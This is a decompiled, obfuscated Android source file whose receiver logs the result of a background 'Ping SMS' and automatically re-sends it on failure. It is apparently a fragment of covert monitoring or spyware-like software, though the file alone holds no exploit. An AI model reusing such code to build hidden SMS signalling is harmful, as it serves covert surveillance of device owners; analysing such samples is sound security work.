package com.network.android.a;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.network.android.c.a.a;
import com.network.android.c.a.b;

/* access modifiers changed from: package-private */
public final class k extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f52a;
    final /* synthetic */ Context b;
    final /* synthetic */ int c;
    final /* synthetic */ int d;

    k(String str, Context context, int i, int i2) {
        this.f52a = str;
        this.b = context;
        this.c = i;
        this.d = i2;
    }

    public final void onReceive(Context context, Intent intent) {
        a.a("Ping SMS SMS_SENT result: " + getResultCode());
        if (getResultCode() == -1) {
            a.a("Ping SMS SMS_SENT result: RESULT_OK");
            if (this.f52a != null) {
                b.a(this.f52a);
            }
        } else {
            a.a("Ping SMS SMS_SENT result:  not(RESULT_OK) sent again in 60*1000" + getResultCode());
            b.a(0, 38, "", com.network.h.b.c(this.f52a));
            b.a(0, -15534, "", com.network.h.b.c(this.f52a));
            Context context2 = this.b;
            int i = this.c;
            c.a(context2, this.d + 1, this.f52a);
        }
        this.b.unregisterReceiver(this);
    }
}
